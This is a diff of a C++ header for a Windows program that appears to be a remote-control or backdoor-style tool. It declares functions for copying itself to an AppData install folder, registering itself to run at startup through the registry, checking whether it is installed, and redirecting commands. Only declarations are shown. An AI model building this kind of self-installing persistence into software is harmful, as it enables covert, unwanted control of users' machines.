@@ -2,15 +2,20 @@
 
 #ifndef GENERAL_H
 #define GENERAL_H
+#define WIN32_LEAN_AND_MEAN
+
 
 #include <Windows.h>
 #include <string>
 #include <tchar.h>
 #include <stdio.h>
+#include <time.h>
+#include <fstream>
 
-#include "variables.h"
-#include "settings.h"
 #include "cmdRedirect.h"
+#include "settings.h"
+#include "conversion.h"
+
 
 
 class General
@@ -25,16 +30,21 @@ public:		//some variables
 	static LPTSTR lpArguments;
 
 public:
+	static bool init();		//main init function
+
 	static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
 	static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
 	static bool directoryExists(const char* dirName);							//checks if directory exists
+
 	static std::string getInstallFolder();											//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
 	static std::string getInstallPath(std::string instFolder);						//gets installpath (environment folder + folder name (if supplied) + file name)
 	static std::string getCurrentPath();	//gets current path of executable
+
 	static bool locationSet();	//checks if executable is located in install position
 	static bool startupSet();	//checks if executable is starting on boot
 	static bool installed();	//checks if executable is installed properly (location + startup)
 
+	static std::string currentDateTime();
 
 public:		//functions
 	static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
